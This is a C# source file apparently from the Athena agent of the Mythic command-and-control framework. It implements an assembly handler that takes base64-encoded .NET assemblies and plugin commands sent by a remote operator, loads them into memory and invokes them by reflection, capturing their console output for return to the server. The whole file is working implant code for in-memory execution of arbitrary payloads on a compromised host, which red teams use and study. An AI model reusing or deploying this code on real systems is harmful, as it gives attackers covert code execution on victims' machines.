using Athena.Commands.Model;
using Athena.Models.Athena.Commands;
using Athena.Utilities;
using System;
using System.Collections.Generic;
using System.IO;
using PluginBase;
using Athena.Models.Mythic.Tasks;
using Newtonsoft.Json;
using System.Threading.Tasks;
using System.Runtime.Loader;
using System.Reflection;
using Athena.Models.Athena.Assembly;
using System.Text;
using System.Collections.Concurrent;

namespace Athena.Commands
{
    public class AssemblyHandler
    {
        private AssemblyLoadContext commandContext { get; set; }
        private ExecuteAssemblyContext executeAssemblyContext { get; set; }
        private ConcurrentDictionary<string, Assembly> loadedCommands { get; set; }
        public bool assemblyIsRunning { get; set; }
        private StringWriter executeAssemblyWriter { get; set; }
        public AssemblyHandler()
        {
            this.commandContext = new AssemblyLoadContext("athcmd");
            this.executeAssemblyContext = new ExecuteAssemblyContext();
            this.loadedCommands = new ConcurrentDictionary<string, Assembly>();
        }
        public async Task<string> LoadAssemblyAsync(byte[] asm)
        {
            //This will load an assembly into our Assembly Load Context for usage with.
            //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
            try
            {
                this.commandContext.LoadFromStream(new MemoryStream(asm));
                //Return true if success
                return "Assembly Loaded!";
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
        public async Task<object> ExecuteAssembly(MythicJob job) //How do I deal with this now?
        {
            if (assemblyIsRunning)
            {
                return new ResponseResult()
                {
                    completed = "true",
                    user_output = "An assembly is already executing.!",
                    task_id = job.task.id,
                };
            }

            ExecuteAssemblyTask ea = JsonConvert.DeserializeObject<ExecuteAssemblyTask>(job.task.parameters);
            
            //Indicating an execute-assembly task is running.
            this.assemblyIsRunning = true;

            string output;

            //Add an alert for when the assembly is finished executing
            try
            {
                using(this.executeAssemblyWriter = new StringWriter())
                {
                    //Backup the original StdOut
                    var origStdOut = Console.Out;
                    
                    //Capture StdOut
                    Console.SetOut(this.executeAssemblyWriter);

                    //Load the Assembly
                    var assembly = this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(ea.assembly)));

                    //Invoke the Assembly
                    assembly.EntryPoint.Invoke(null, new object[] { await Misc.SplitCommandLine(ea.arguments) }); //I believe this blocks until it's finished

                    output = await this.GetAssemblyOutput(); //For now

                    //Return StdOut back to original location
                    Console.SetOut(origStdOut);
                }

                this.assemblyIsRunning = false;

                //Maybe set an event that the execution is finished?
                return new ResponseResult
                {
                    completed = "true",
                    user_output = output,
                    task_id = job.task.id
                };
            }
            catch (Exception e)
            {
                return new ResponseResult
                {
                    completed = "true",
                    user_output = this.GetAssemblyOutput() + Environment.NewLine + e,
                    task_id = job.task.id,
                    status = "error"
                };
            }
        }
        //Might be able to return this as an object too
        public async Task<string> GetAssemblyOutput()
        {
            await this.executeAssemblyWriter.FlushAsync();

            return this.executeAssemblyWriter.GetStringBuilder().ToString();
        }
        public async Task<object> ClearAssemblyLoadContext(string task_id)
        {
            //This will clear out the assembly load context for the Athena agent in order to leave it fresh for future use.
            //This will help scenarios where you have a library loaded with a specific version, but need to load that library again for a different one
            try
            {
                this.executeAssemblyContext.Unload();
                this.executeAssemblyContext = new ExecuteAssemblyContext();
                return new ResponseResult
                {
                    task_id = task_id,
                    completed = "true",
                    user_output = "AssemblyLoadContext reset."
                };
            }
            catch (Exception e)
            {
                return "Failed to clear AssemblyLoadContext!" + Environment.NewLine + e.Message;
            }
        }
        public async Task<LoadCommandResponseResult> LoadCommandAsync(MythicJob job)
        {
            LoadCommand command = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);

            try
            {
                var loadedAssembly = this.loadedCommands.GetOrAdd(command.command, this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(command.assembly))));
                return new LoadCommandResponseResult()
                {
                    completed = "true",
                    user_output = "Command loaded!",
                    task_id = job.task.id,
                    commands = new List<CommandsResponse>()
                        {
                            new CommandsResponse()
                            {
                                action = "add",
                                cmd = command.command,
                            }
                        }
                };
            }
            catch (Exception e)
            {
                return new LoadCommandResponseResult()
                {
                    completed = "true",
                    user_output = "Failed to load Command!" + Environment.NewLine + e.Message,
                    task_id = job.task.id,
                    status = "error",
                    commands = new List<CommandsResponse>(),
                };

            }
        }
        public async Task<object> RunLoadedCommand(MythicJob job)
        {
            try
            {
                Type t = this.loadedCommands[job.task.command].GetType("Athena.Plugin");
                var methodInfo = t.GetMethod("Execute", new Type[] { typeof(Dictionary<string, object>) });

                Dictionary<string, object> parameters = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters) ?? new Dictionary<string,object>();
                parameters.Add("task-id", job.task.id);
                return methodInfo.Invoke(null, new object[] { parameters });
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = e.Message,
                    completed = "true",
                    status = "error",
                    task_id = job.task.id,
                };
            }
        }

        public async Task<bool> CommandIsLoaded(string command)
        {
            return this.loadedCommands.ContainsKey(command);
        }
    }

    public class ConsoleWriterEventArgs : EventArgs
    {
        public string Value { get; private set; }
        public ConsoleWriterEventArgs(string value)
        {
            Value = value;
        }
    }
    public class ConsoleWriter : TextWriter
    {
        public override Encoding Encoding { get { return Encoding.UTF8; } }

        public override void Write(string value)
        {
            if (WriteEvent is not null) WriteEvent(this, new ConsoleWriterEventArgs(value));
            base.Write(value);
        }

        public override void WriteLine(string value)
        {
            if (WriteLineEvent is not null) WriteLineEvent(this, new ConsoleWriterEventArgs(value));
            base.WriteLine(value);
        }

        public event EventHandler<ConsoleWriterEventArgs> WriteEvent;
        public event EventHandler<ConsoleWriterEventArgs> WriteLineEvent;
    }
}
